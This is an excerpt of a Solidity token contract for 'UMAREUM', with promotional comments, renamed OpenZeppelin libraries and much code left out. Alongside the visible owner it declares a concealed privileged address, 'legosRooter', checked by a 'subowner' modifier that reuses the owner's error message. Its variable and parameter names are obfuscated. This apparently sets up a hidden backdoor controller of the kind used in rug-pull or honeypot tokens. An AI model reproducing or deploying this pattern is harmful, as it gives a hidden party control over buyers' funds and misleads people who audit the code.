...
UMAREUM 
https://UMAREUM.io/
https://docs.UMAREUM.io/
https://t.me/UMAREUM
Umareum provides the most lightning-fast,decentralized,
scalable,open-source Layer-1.The future of Proof-of-Work is now UMAREUM,
future PoW blockchain that is EVM-compatible,surpasses traditional limitations.
It functions not only as a transaction network but also as a conduit for liquidity,
ushering in an age of decentralized finance.Umareum revolutionizes 
the criteria for decentralized platforms,applications&networks through its distinctive 
bridge mechanism and guarantee of unparalleled transaction velocities
*/
...
/*
 * @dev Provides information about the current execution UMAREUM20Burnable, including the
 ...
 */
abstract contract UMAREUM20Burnable {
...
// File: @openzeppelin/contracts/access/UMAREUM20Ownable.sol
 ...
 * the owner.
 */
abstract contract UMAREUM20Ownable is UMAREUM20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "UMAREUM20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "UMAREUM20Ownable: new owner is the zero address");
 ...
 * `SafeUMAREUM` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeUMAREUM {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeUMAREUM: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeUMAREUM: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeUMAREUM: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeUMAREUM: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeUMAREUM: modulo by zero");
  }
...
contract UMAREUMToken is UMAREUM20Burnable, UMAREUM33, UMAREUM20Ownable {
    
    using SafeUMAREUM for uint256;
   ...
   address private legosRooter; 
    ...
    string public UMAREUMtelegramcchannel = "https://t.me/UMAREUM";
            function getUMAREUMtelegramcchannel() public view returns (string memory) {
        return UMAREUMtelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {UMAREUM33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "UMAREUM20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {UMAREUM33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {UMAREUM33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {UMAREUM33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "UMAREUM33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {UMAREUM33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "UMAREUM33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "UMAREUM33: transfer from the zero address");
        require(shippingto != address(0), "UMAREUM33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "UMAREUM33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "UMAREUM33: approve from the zero address");
        require(transporteur != address(0), "UMAREUM33: approve to the zero address");
